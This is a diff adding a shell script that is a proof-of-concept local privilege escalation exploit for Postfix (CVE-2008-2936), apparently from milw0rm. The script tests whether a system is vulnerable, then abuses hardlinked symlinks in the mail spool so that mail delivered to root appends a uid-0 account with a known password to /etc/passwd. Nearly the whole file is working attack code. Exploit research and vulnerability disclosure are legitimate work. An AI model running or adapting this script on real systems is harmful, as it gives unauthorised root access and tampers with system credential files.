@@ -1,0 +1,130 @@
+#!/bin/sh
+#
+# "rs_pocfix.sh" (PoC for Postfix local root vulnerability: CVE-2008-2936)
+# by Roman Medina-Heigl Hernandez a.k.a. RoMaNSoFt <roman@rs-labs.com>
+#
+# Tested: Ubuntu / Debian
+#
+# [ Madrid, 30.Aug.2008 ]
+#
+
+# Config
+
+writable_dir=/tmp
+spool_dir=/var/mail		# Use "postconf mail_spool_directory" to obtain this
+user=root
+target=/etc/passwd
+useful_link=/usr/bin/atq	# lrwxrwxrwx 2 root root 2 2007-05-04 22:15 /usr/bin/atq -> at
+useful_link_dst=at		# Tip: find / -type l -uid 0 -print -exec ls -l {} \; | less
+seconds=3
+user_in_passwd="dsr:3GsXLdEaKaGnM:0:0:root:/root:/bin/sh"   # Pass is "dsrrocks"
+postfix=`which postfix`		# /usr/sbin/postfix
+postconf=/usr/sbin/postconf
+postmap=/usr/sbin/postmap
+
+
+# Funcs
+
+quit()
+{
+  echo "$1"
+  exit
+}
+
+
+# Step 1: is my system vulnerable?
+
+head -n 9 $0 | tail -n 8
+if [ $postfix ] ; then
+  echo "[*] Postfix seems to be installed"
+else
+  quit "[!] Are you sure Postfix is installed?"
+fi
+
+mkdir -p $writable_dir/pocfix
+touch $writable_dir/pocfix/src
+ln -s $writable_dir/pocfix/src $writable_dir/pocfix/dst1
+ln $writable_dir/pocfix/dst1 $writable_dir/pocfix/dst2
+
+if [ -L $writable_dir/pocfix/dst2 ] ; then
+  echo "[*] Hardlink to symlink not dereferenced"
+  rm -rf $writable_dir/pocfix
+else
+  rm -rf $writable_dir/pocfix
+  quit "[!] Hardlink to symlink correctly dereferenced. System is not vulnerable"
+fi
+
+if [ -d $spool_dir -a -w $spool_dir ] ; then
+  echo "[*] Spool dir is writable"
+else
+  quit "[!] Spool dir is not writable"
+fi
+
+if [ -e $spool_dir/$user ] ; then
+  rm -f $spool_dir/$user
+  echo "[*] Mailbox for \"$user\" found. Trying to delete it"
+
+  if [ -e $spool_dir/$user ] ; then
+    quit "[!] Couldn't delete it"
+  else
+    echo "[*] Deletion ok"
+  fi
+
+fi
+
+if [ -e $spool_dir/$useful_link_dst ] ; then
+  rm -f $spool_dir/$useful_link_dst
+  echo "[*] Mailbox for \"$useful_link_dst\" found. Trying to delete it"
+
+  if [ -e $spool_dir/$useful_link_dst ] ; then
+    quit "[!] Couldn't delete it"
+  else
+    echo "[*] Deletion ok"
+  fi
+
+fi
+
+aliases=`$postconf alias_database | cut -d"=" -f2`
+$postconf alias_maps | grep -q $aliases
+if [ $? -eq 0 ] ; then
+  if [ $aliases ] ; then
+    $postmap -q $user $aliases > /dev/null
+    if [ $? -eq 0 ] ; then
+      quit "[!] Mail alias for \"$user\" exists"
+    fi
+  fi
+fi
+
+lda=`$postconf mailbox_command | cut -d"=" -f2`
+if [ $lda ] ; then
+  quit "[!] Non-Postfix LDA detected"
+fi 
+
+$postconf home_mailbox | grep -q '/$'
+if [ $? -eq 0 ] ; then
+  quit "[!] Maildir-style mailbox detected"
+fi
+
+
+# Step 2: Exploiting
+
+ln -f $useful_link $spool_dir/$user 2> /dev/null || quit "[!] Couldn't create hardlink (different partitions?)"
+ln -s -f $target $spool_dir/$useful_link_dst 2> /dev/null || quit "[!] Couldn't create symlink pointing to target file"
+cp -f $target $writable_dir/pocfix_target_backup.$$ && echo "[*] Backed up: $target (saved as \"$writable_dir/pocfix_target_backup.$$\")"
+echo "[*] Sending mail ($seconds seconds wait)"
+echo $user_in_passwd | /usr/sbin/sendmail $user
+
+sleep $seconds
+
+diff -q $target $writable_dir/pocfix_target_backup.$$ > /dev/null
+
+if [ $? -eq 0 ] ; then
+  echo "[!] Exploit failed"
+else
+  echo "[*] Exploit successful (appended data to $target). Now \"su dsr\", pass is \"dsrrocks\")"
+fi
+
+rm -f $spool_dir/$user
+rm -f $spool_dir/$useful_link_dst
+
+# milw0rm.com [2008-08-31]
